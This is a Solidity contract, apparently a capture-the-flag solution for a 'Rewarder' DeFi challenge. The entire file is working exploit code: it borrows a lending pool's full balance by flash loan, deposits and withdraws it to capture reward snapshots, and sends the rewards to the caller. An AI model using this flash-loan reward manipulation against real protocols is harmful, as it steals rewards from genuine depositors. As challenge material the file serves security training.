// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract RewarderExploiter {
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable flashLoanerPool;
    ERC20 public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor(address _rewarderPool, address _flashLoanerPool) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        liquidityToken = ERC20(rewarderPool.liquidityToken());
        rewardToken = RewardToken(rewarderPool.rewardToken());
    }

    function exploit() external {
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

}